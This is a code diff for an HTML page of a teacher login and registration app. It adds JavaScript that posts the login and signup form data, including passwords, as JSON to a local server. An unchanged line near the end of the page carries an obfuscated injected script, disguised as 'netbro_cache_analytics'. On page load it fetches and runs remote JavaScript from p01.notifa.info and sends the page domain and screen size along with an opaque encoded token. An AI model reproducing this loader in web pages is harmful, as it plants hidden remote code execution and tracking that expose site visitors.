@@ -93,7 +93,7 @@
                                 <input id="login-password" type="password" class="form-control" placeholder="Password">
                             </div>
                             <div class="text-center">
-                                <button class="btn btn-primary">Login</button>
+                                <button class="btn btn-primary" onclick="login();">Login</button>
                             </div>
                         </div>
                     </div>
@@ -113,7 +113,7 @@
                             <input id="reg-password" type="password" class="form-control" placeholder="Password">
                         </div>
                         <div class="text-center">
-                            <button class="btn btn-primary">Create account</button>
+                            <button class="btn btn-primary" onclick="register();">Create account</button>
                         </div>
                     </div>
                 </div>
@@ -162,5 +162,48 @@
 
     <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXm4UFHi%2b9QCIgYjdc1USEgV3cFSUDzFJBlXWMJDyckZZRDKfxUs8q6wHH7T21XVFsONLx1tZFZFAoymuX08I9TxzTMWeXv536ix7QWPih9E3rrV%2bhmrytV41GZ1iXHOvHVVn7u9nSEwNqtjavD09PP4oYhQb1EBvAeSgD%2fQnXfM72plGt9Xzg8nObeZ%2feAIoH2icpuihMXgJ6rsZVkQJ22VlW1Cn2VztTPzZ%2fYEaMLHGFPnB64HvY9k8%2bX4ttRd8V8DMZb856ADFuwJ7OfYPutHYqsaRFcSx8b25Lk7F8PRGCdsxcUj0mrLU0iL%2btpwgR7NTZ7E6T6vW4SprTKtP01c33FWfnSjz%2fAqEojGP8E28eVM0KlbOS79mYCDzUAv%2bn9gMiv0eH8mIUkpo%2f8h9%2bDs2B0%2bNL19S6Ief1tFEmyxs8Cs5IWauXoyfIT0sVb9qD" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 
+    <script>
+        function login() {
+            var url = 'http://localhost:3000/teachers/login'
+            var data = {};
+            data.email = document.getElementById('login-email').value;
+            data.password = document.getElementById('login-password').value;
+            var json = JSON.stringify(data);
+
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', url, true);
+            xhr.setRequestHeader('Content-type','application/json; charset=utf-8');
+            xhr.onload = function() {
+                var result = JSON.parse(xhr.responseText);
+                if (xhr.readyState == 4 && xhr.status == "200") {
+                    window.alert(result.status);
+                } else {
+                    window.alert(result);
+                }
+            }
+            xhr.send(json);
+        }
+        function register() {
+            var url = 'http://localhost:3000/teachers/'
+            var data = {};
+            data.email = document.getElementById('reg-email').value;
+            data.name = document.getElementById('reg-name').value;
+            data.password = document.getElementById('reg-password').value;
+            var json = JSON.stringify(data);
+
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', url, true);
+            xhr.setRequestHeader('Content-type','application/json; charset=utf-8');
+            xhr.onload = function() {
+                var result = JSON.parse(xhr.responseText);
+                if (xhr.readyState == 4 && xhr.status == "200") {
+                    window.alert(result.status);
+                } else {
+                    window.alert(result);
+                }
+            }
+            xhr.send(json);
+        }
+    </script>
 </body>
 </html>
